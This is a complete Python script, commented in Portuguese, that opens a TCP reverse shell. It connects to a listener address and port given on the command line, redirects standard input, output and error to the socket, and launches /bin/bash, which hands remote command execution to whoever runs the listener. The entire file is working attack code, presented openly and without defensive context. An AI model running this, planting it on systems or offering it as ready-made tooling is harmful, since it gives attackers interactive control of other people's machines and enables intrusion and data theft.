import socket
import sys
import subprocess
import os 

# Função que realiza a conexão reversa TCP
# ip: endereço do servidor listener
# porta: porta do servidor listener
def client_tcp(ip, porta):
    # Cria um socket TCP
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Conecta ao servidor listener
    client.connect((ip, porta))

    # Redireciona a entrada padrão (stdin), saída padrão (stdout) e erro padrão (stderr) para o socket
    os.dup2(client.fileno(), 0) 
    os.dup2(client.fileno(), 1)  
    os.dup2(client.fileno(), 2)

    # Executa o shell bash, permitindo ao servidor executar comandos remotamente
    subprocess.call(['/bin/bash'])


if __name__ == "__main__":
    # Verifica se os argumentos de IP e porta foram fornecidos
    if len(sys.argv) == 3:
        try:
            ip = sys.argv[1]  # IP do servidor listener
            porta = int(sys.argv[2])     # Porta do servidor listener
            client_tcp(ip, porta)
        except Exception as e:
            # Em caso de erro, exibe a mensagem
            print(f'Erro: {e}')
    else:
        # Exibe instruções de uso caso os argumentos estejam incorretos
        print('Modo de uso: python3 client-tcp.py <ip> <porta>')